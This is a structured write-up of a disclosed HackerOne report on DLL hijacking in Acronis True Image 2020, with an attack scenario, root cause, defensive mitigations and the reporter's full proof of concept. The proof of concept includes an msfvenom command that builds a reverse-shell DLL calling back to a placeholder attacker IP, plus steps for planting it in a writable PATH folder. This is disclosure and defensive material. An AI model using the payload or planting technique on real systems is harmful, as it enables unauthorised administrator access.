# Acronis True Image 2020 - DLL Hijacking Leading to Privilege Escalation

## Metadata
- **Source:** HackerOne
- **Report:** 959017 | https://hackerone.com/reports/959017
- **Submitted:** 2020-08-14
- **Reporter:** vanitas
- **Program:** Acronis True Image 2020 (Acronis Cyber Backup 15.0.24197)
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Insecure Library Loading, DLL Hijacking, Privilege Escalation, Uncontrolled Search Path
- **CVEs:** None
- **Category:** auth-crypto

## Summary
TrueImage.exe searches for tcmalloc.dll in directories specified in the SYSTEM PATH variable before checking the application's own directory, allowing authenticated users to place a malicious DLL in a writable PATH location (C:\Python27) to achieve arbitrary code execution with administrator privileges. When an administrator runs Acronis True Image, the malicious DLL is loaded and executed in the context of the administrative account.

## Attack scenario
1. Attacker identifies that Python 2.7 is installed and C:\Python27 is in the SYSTEM PATH variable and writable by Authenticated Users
2. Attacker generates malicious tcmalloc.dll using msfvenom configured with reverse shell payload
3. Attacker places the malicious tcmalloc.dll in C:\Python27 directory (requires only Authenticated User privileges)
4. Attacker waits for an administrator to launch Acronis True Image application
5. TrueImage.exe searches for tcmalloc.dll and loads the malicious version from C:\Python27 before checking legitimate locations
6. Malicious DLL executes in the context of the administrator account, providing attacker with administrative shell access

## Root cause
TrueImage.exe does not implement secure DLL search ordering. It searches for required DLLs (tcmalloc.dll) in SYSTEM PATH directories before checking the application's installation directory, combined with writable PATH locations accessible to low-privileged users.

## Attacker mindset
Opportunistic privilege escalation: A low-privileged user plants a trojan DLL in a shared, writable system path directory and waits for a high-privileged user to run the vulnerable application, achieving privilege elevation without direct interaction or exploitation of the administrator.

## Defensive takeaways
- Implement DLL search order hijacking mitigations: use absolute paths for DLL loading or safe search order (application directory before PATH)
- Remove or restrict write permissions on directories in SYSTEM PATH to prevent arbitrary DLL placement
- Use SetDllDirectory or LoadLibraryEx with LOAD_LIBRARY_SEARCH_APPLICATION_DIR flag to control DLL search paths
- Monitor Process Monitor logs for 'NOT FOUND' results in unexpected PATH directories during DLL load attempts
- Implement application manifest with requestedExecutionLevel to ensure proper privilege handling
- Use code signing and manifest-based DLL loading to prevent unsigned DLL substitution
- Conduct DLL hijacking threat modeling for all executables running with elevated privileges

## Variant hunting
Search for other Acronis executables that may load tcmalloc.dll or similar Google performance tools libraries insecurely
Identify other applications that depend on tcmalloc.dll and implement similar insecure search patterns
Check for DLL hijacking opportunities in other third-party backup/imaging solutions
Audit Python installation directories in PATH for applications loading DLLs from those locations
Look for similar privilege escalation patterns where PATH-based directories are writable and searched before application directories

## MITRE ATT&CK
- T1547.001
- T1574.001
- T1190
- T1548.002
- T1053
- T1204.002

## Notes
Report demonstrates excellent use of Process Monitor to identify DLL loading behavior and PATH search patterns. Attack requires pre-existing Authenticated User access but escalates to administrator. The vulnerability is particularly effective because Python 2.7 installation in PATH is common in enterprise environments. Report includes clear step-by-step PoC with screenshots demonstrating each phase of exploitation.

## Full report
<details><summary>Expand</summary>

Vulnerability Explanation :
	An issue was discovered in Acronis Service Manager Service which intregated from Acronis Cyber Backup ver.15.0.24197. This service is suffered by untrusted search binary. The malicious users who are in “Authenticated Users” group can use malicious DLL file to execute arbitrary code and escalate privilege to impersonate as local administrator.

Vulnerable application version :
	 Acronis Cyber Backup ver.15.0.24197 (maybe lower are affected too).

PoC Operating System version :
	Microsoft Windows 10 Home - 64 bits with latest patched.

Vulnerability found :
1. Executable file : TrueImage.exe.
2. Arbitrary execution using tcmalloc.dll.

Lab Environment :
1. Install Python2.7 for windows, we can see C:\Python27 which is default home application of Python2.7 is added to SYSTEM PATH variable. Open from environment variable. [Ref Picture : 01.jpg, 02.jpg]

Vulnerability Finding :
1. See from Desktop icon : "Acronis True Image" running by execute file : "C:\Program Files (x86)\Acronis\TrueImageHome\TrueImageLauncher.exe". This one has spawned sub-process binary such as : TrueImage.exe
2. Open Process Monitor, to find out how it is doing. Add filter with following criteria : [Ref Picture : 03.jpg]
• Process Name is TrueImage.exe (Include)
• Result contains NOT FOUND (Include)
• Path contains Python27 (Include)
3. From Process Monitor, After we execute Acronis True Image which only administrative running only, we can see suspicious executeable file name as : "tcmalloc.dll" was called from TrueImage.exe and several DLL are called from the path is defined in SYSTEM PATH variable. [Ref Picture : 04.jpg]
4. When closely look for this process details, see that C:\Python27\tcmalloc.dll was loaded by "John" privilege who is local administrator with 32 bits process. [Ref Picture : 05.jpg, 06.jpg]
This is potential to do privilege escalation as Administrative privilege account via untrusted DLL search-ordering exploit

Proof-of-concept exploitation :
1. Use msfvenom tool on Kali-linux to generate malicious DLL file, then save as "tcmalloc.dll". It will generate shellcode to send reverse shell to attacker when this exe is loaded to target system as below command. [Ref Picture : 07.jpg]
Command : 
msfvenom -p windows/shell_reverse_tcp LHOST=[Attacker-IP] LPORT=[Attacker-port] -f dll > tcmalloc.dll
2. On attacker side (Kali-linux). Start reverse shell listener for receive reverse shell.
3. Transfer malicious DLL file to target server, place tcmalloc.dll at C:\Python27. Since this folder is writeable by any of users are in Authenticated Users group, then this low privileged user is allow to place this malicious DLL file on this. [Ref Picture : 08.jpg]
4. Wait for any of administrator account to open Acronis True Image to inject DLL into its main process running.
5. Get reverse shell as user :  John who is local administrator on this host, we can see this reverse shell is spawned by malicious DLL file. [Ref Picture : 09.jpg, 10.jpg, 11.jpg]

## Impact

Malicious users are able to gain privilege escalation permission as local administrator account.

</details>

---
*Analysed by Claude on 2026-05-24*
